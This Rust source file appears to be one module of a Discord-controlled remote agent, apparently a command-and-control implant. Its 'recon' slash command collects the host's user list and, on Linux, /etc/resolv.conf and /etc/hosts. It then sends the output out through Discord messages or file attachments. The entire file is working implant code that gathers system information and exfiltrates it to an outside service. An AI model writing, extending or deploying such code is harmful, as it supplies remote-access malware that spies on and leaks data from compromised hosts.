use std::borrow::Cow;

use chrono::Utc;
use poise::serenity_prelude::AttachmentType;
use tracing::info as informational;

use crate::{
	discord_utils::bot_functions::split_string,
	os::recon_utils::{run_recon, ReconType},
	Context,
	Error,
};

#[derive(Debug, poise::ChoiceParameter)]
pub enum ReconChoices {
	/*  Platform Agnostic */
	#[name = "Get user list"]
	Userlist,

	/* Platform Specific - Linux */
	#[cfg(target_os = "linux")]
	#[name = "Get /etc/resolv.conf"]
	EtcResolv,

	#[cfg(target_os = "linux")]
	#[name = "Get /etc/hosts"]
	EtcHosts,
	/* Platform Specific - Windows */
}

impl ReconChoices {
	fn as_str(&self) -> &str {
		match self {
			/*  Platform Agnostic */
			ReconChoices::Userlist => "userlist",

			/* Platform Specific - Linux */
			#[cfg(target_os = "linux")]
			ReconChoices::EtcResolv => "/etc/resolv.conf",
			#[cfg(target_os = "linux")]
			ReconChoices::EtcHosts => "/etc/hosts",
			/* Platform Specific - Windows */
		}
	}
}

// Windows specific version of the recon command
#[cfg(target_os = "windows")]
/// Performs various recon operations/commands with the agent.
#[poise::command(slash_command)]
pub async fn recon(ctx: Context<'_>, #[description = "A supported recon option"] operation: ReconChoices) -> Result<(), Error> {
	let result = match operation.as_str() {
		"userlist" => run_recon("userlist", ReconType::Agnostic),
		_ => run_recon(operation.as_str(), ReconType::Windows),
	};
	recon_handler(ctx, result).await?;
	Ok(())
}

// Linux specific version of the recon command
#[cfg(target_os = "linux")]
/// Performs various recon operations/commands with the agent.
#[poise::command(slash_command)]
pub async fn recon(ctx: Context<'_>, #[description = "A supported recon option"] operation: ReconChoices) -> Result<(), Error> {
	let result = match operation.as_str() {
		"userlist" => run_recon("userlist", ReconType::Agnostic),
		_ => run_recon(operation.as_str(), ReconType::Linux),
	};
	recon_handler(ctx, result).await?;
	Ok(())
}

pub async fn recon_handler(ctx: Context<'_>, operation: String) -> Result<(), Error> {
	// Less than soft char limit, just drop the string as a response
	if operation.len() < 2000 {
		let formatted = format!("```ansi\n{}```", operation);
		ctx.say(formatted).await?;
	}
	// Greater than soft char limit, but less than the hard char limit.
	else if operation.len() >= 2000 && operation.len() <= 8000 {
		// Split the strings into a vec, and create an initial response with the first vec.
		let split_strings = split_string(&operation);
		let formatted = format!("```ansi\n{}```", split_strings.get(0).unwrap());

		ctx.say(formatted).await?;

		// For remaining vecs, send a follow up response.
		for string in split_strings.iter().skip(1) {
			let formatted = format!("```ansi\n{}```", string);
			let channel_id = ctx.channel_id();
			channel_id.say(&ctx.serenity_context().http, formatted).await?;
		}
	} else {
		ctx.defer().await?; // Let's defer here because this might take a while...

		// Send this big ass message as an attachment.
		let string = operation.clone();
		let bytes = string.as_bytes();

		informational!("Recieved extremely large message: {:?}", bytes.len());

		// Create an attachment from the bytes
		let attachment = AttachmentType::Bytes {
			data:     Cow::from(bytes),
			filename: format!("{}.txt", Utc::now().to_string()),
		};

		ctx.send(|reply| reply.content("File was too large, sent attachment instead:").attachment(attachment))
			.await?;
	}
	Ok(())
}
